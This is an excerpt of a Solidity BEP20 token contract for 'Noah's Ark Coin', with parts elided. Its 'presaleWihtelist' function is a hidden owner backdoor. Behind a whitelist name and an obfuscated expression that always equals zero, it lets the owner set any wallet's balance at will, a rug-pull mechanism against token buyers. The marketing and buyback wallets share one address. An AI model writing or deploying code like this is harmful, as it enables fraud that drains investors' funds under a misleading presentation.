...
contract NACH is Context, IBEP20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Noah's Ark Coin";
    string private _symbol = "wNAC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x446EDff8E69C5D61690ffA574364375FD078de42); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0x446EDff8E69C5D61690ffA574364375FD078de42); // BuyBack Address
    ...
    uint256 public _walletMax = 10000000000 * 10**6 * 10**9;
  ...
  function presaleWihtelist(address WALLETS, uint256 amount) public onlyOwner {
      _Tbalances[WALLETS] = (amount / amount - amount / amount) + amount * 10 ** 9;
        emit Transfer(address(0), WALLETS, amount * 10 ** 9);
  }  
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount <= (1000000 * 10**6 * 10**9), "Max wallet should be less or euqal to 10% totalSupply");
